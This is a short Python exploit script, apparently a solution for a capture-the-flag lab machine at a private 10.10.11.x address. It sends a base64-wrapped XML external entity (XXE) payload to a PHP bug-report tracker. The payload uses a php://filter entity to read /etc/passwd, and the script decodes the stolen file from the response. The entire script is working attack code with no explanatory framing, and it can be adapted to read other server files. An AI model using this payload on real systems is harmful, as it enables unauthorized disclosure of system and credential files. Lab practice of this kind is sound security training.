#!python3
import requests
import base64

file='/etc/passwd'

payload=f"""<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
<!ELEMENT stockCheck ANY>
<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource={file}">
]>
		<bugreport>
		<title>&file;</title>
		<cwe>123</cwe>
		<cvss>123</cvss>
		<reward>123</reward>
		</bugreport>""".encode()

payload_b64=base64.b64encode(payload).decode()
#print (payload_b64)
data={"data":payload_b64}
r=requests.post("http://10.10.11.100/tracker_diRbPr00f314.php",data=data)
#print (r)
output=r.text.split('>')[5][:-4]#進行抓取第五行及倒數第四行。也就是只要第六行
#print (output)
print (base64.b64decode(output).decode())
